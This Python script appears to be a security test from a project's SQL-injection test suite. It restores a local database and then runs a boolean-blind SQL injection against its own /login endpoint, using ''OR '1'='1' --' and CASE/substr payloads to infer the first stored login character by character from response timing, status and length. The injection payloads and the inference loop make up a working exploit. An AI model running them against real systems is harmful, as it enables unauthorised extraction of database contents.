#!/usr/bin/env python3
# sql_boolean_blind_improved.py
# Boolean blind targeting POST /login with stronger sampling and median-based comparison.
# Run:
#   python .\tests\seguranca\sql_injection\cenarios\sql_boolean_blind_improved.py

from pathlib import Path
from datetime import datetime
import shutil, requests, time, json, statistics, os

# config
BACKUP_FILENAME = "pessoas_backup.db"
BACKUP_SEARCH_DEPTH = 8
TARGET_DB_SUBPATH = Path("instance") / "pessoas.db"
BASE = os.environ.get("PTSS_BASE_URL", "http://127.0.0.1:5000")
LOGIN_ENDPOINT = f"{BASE}/login"
OUT_DIR = Path("respostas") / "sql_injection" / "cenarios" / "sql_boolean_blind_improved"
OUT_DIR.mkdir(parents=True, exist_ok=True)
OUT_FILE = OUT_DIR / f"sql_boolean_blind_improved_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"

ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_POS = 3                # quantas posições tentar (inicie pequeno)
SAMPLES_PER_CHECK = 10     # quantas amostras por candidato
TIME_THRESHOLD = 0.03      # diferença de mediana (s) a considerar relevante
CONSISTENCY_RATIO = 0.7    # proporção de amostras que devem confirmar sinal

def find_backup(name=BACKUP_FILENAME, max_up=BACKUP_SEARCH_DEPTH):
    p = Path(__file__).resolve().parent
    for _ in range(max_up):
        candidate = p / name
        if candidate.exists():
            return candidate
        p = p.parent
    return None

def restore_db(backup_path):
    if not backup_path:
        return False, "backup not found"
    project_root = backup_path.parent
    dest = project_root / TARGET_DB_SUBPATH
    dest.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(str(backup_path), str(dest))
    return True, f"restored {backup_path} -> {dest}"

def write(line):
    with OUT_FILE.open("a", encoding="utf-8") as f:
        f.write(line + "\n")

def measure_post(session, payload, samples=SAMPLES_PER_CHECK):
    timings = []
    statuses = []
    lengths = []
    for _ in range(samples):
        start = time.time()
        try:
            r = session.post(LOGIN_ENDPOINT, json=payload, timeout=15)
            elapsed = time.time() - start
            timings.append(elapsed)
            statuses.append(r.status_code)
            body = r.text or ""
            lengths.append(len(body))
        except Exception as e:
            timings.append(None)
            statuses.append(None)
            lengths.append(None)
        time.sleep(0.08)
    # filter None
    valid_timings = [t for t in timings if t is not None]
    median_t = statistics.median(valid_timings) if valid_timings else None
    return {"timings": timings, "median": median_t, "statuses": statuses, "lengths": lengths}

def candidate_payload_for_char(pos, ch):
    # this crafts a boolean expression injected into 'login' JSON field
    # boolean: substr((SELECT login FROM pessoa LIMIT 1), pos, 1) = 'ch'
    inj = f"' OR (SELECT CASE WHEN (substr((SELECT login FROM pessoa LIMIT 1),{pos},1)='{ch}') THEN 1 ELSE 0 END)=1 -- "
    return {"login": inj, "senha": "x"}

def baseline_payload():
    # safe payload that yields false (unlikely to match)
    return {"login": "normal_user_zzzz", "senha": "x"}

def true_payload(pos, ch):
    # a payload constructed to be true (if you know expected char) — we will construct a 'always true' variant
    return {"login": "' OR '1'='1' -- ", "senha": "x"}

def analyze_candidate(baseline_meas, candidate_meas):
    # compare medians, status modes, and lengths
    result = {"median_diff": None, "status_change": False, "length_change": False, "consistency": 0.0}
    if baseline_meas["median"] is not None and candidate_meas["median"] is not None:
        result["median_diff"] = candidate_meas["median"] - baseline_meas["median"]
    # status mode comparison
    def mode(lst):
        vals = [v for v in lst if v is not None]
        return max(set(vals), key=vals.count) if vals else None
    bm = mode(baseline_meas["statuses"])
    cm = mode(candidate_meas["statuses"])
    result["status_change"] = (bm != cm) and (cm is not None)
    # length comparison by median
    try:
        bl = statistics.median([l for l in baseline_meas["lengths"] if l is not None])
        cl = statistics.median([l for l in candidate_meas["lengths"] if l is not None])
        result["length_change"] = (abs((cl or 0) - (bl or 0)) > 10)
    except Exception:
        result["length_change"] = False
    # consistency: proportion of candidate timings > baseline median (if baseline exists)
    if baseline_meas["median"] is not None:
        count = sum(1 for t in candidate_meas["timings"] if t is not None and t > baseline_meas["median"])
        total = sum(1 for t in candidate_meas["timings"] if t is not None)
        result["consistency"] = (count / total) if total else 0.0
    return result

def main():
    write(f"Data de execução: {datetime.utcnow().isoformat()}Z")
    bpath = find_backup()
    ok, msg = restore_db(bpath)
    write(f"Restore: {ok} - {msg}")
    write(f"Target endpoint: {LOGIN_ENDPOINT}")
    write("-"*80)

    session = requests.Session()
    session.headers.update({"User-Agent": "sqli-boolean-improved/1.0"})

    # baseline: measure a 'false' payload and an 'always true' control
    baseline = measure_post(session, baseline_payload(), samples=SAMPLES_PER_CHECK)
    always_true = measure_post(session, true_payload(1,'a'), samples=SAMPLES_PER_CHECK)
    write(f"Baseline median: {baseline['median']} | true-median: {always_true['median']} | baseline status mode sample: {baseline['statuses'][:6]}")
    write("-"*60)

    inferred = {}
    for pos in range(1, MAX_POS+1):
        write(f"Inferring position {pos} ...")
        best = None
        for ch in ALPHABET:
            payload = candidate_payload_for_char(pos, ch)
            meas = measure_post(session, payload, samples=SAMPLES_PER_CHECK)
            analysis = analyze_candidate(baseline, meas)
            # consider candidate if median_diff > TIME_THRESHOLD OR status change OR length change AND consistency above ratio
            cond_time = (analysis["median_diff"] is not None and abs(analysis["median_diff"]) >= TIME_THRESHOLD)
            cond_status = analysis["status_change"]
            cond_len = analysis["length_change"]
            cond_consistency = analysis["consistency"] >= CONSISTENCY_RATIO
            write(f"char='{ch}' median_diff={analysis['median_diff']} status_change={cond_status} len_change={cond_len} consistency={analysis['consistency']:.2f}")
            if (cond_time or cond_status or cond_len) and cond_consistency:
                best = (ch, analysis)
                break  # take first strong candidate to be conservative
        if best:
            inferred[pos] = best[0]
            write(f"Inferred pos {pos} => '{best[0]}' (analysis={best[1]})")
        else:
            write(f"No conclusive candidate for pos {pos}.")
        write("-"*40)

    write(f"Inferred (partial): {inferred}")
    write("Resultado final: Feito. (se não conclusivo, aumente SAMPLES_PER_CHECK, MAX_POS ou tente exfiltration/union)")
    print("Done. Evidence:", OUT_FILE)

if __name__ == '__main__':
    main()
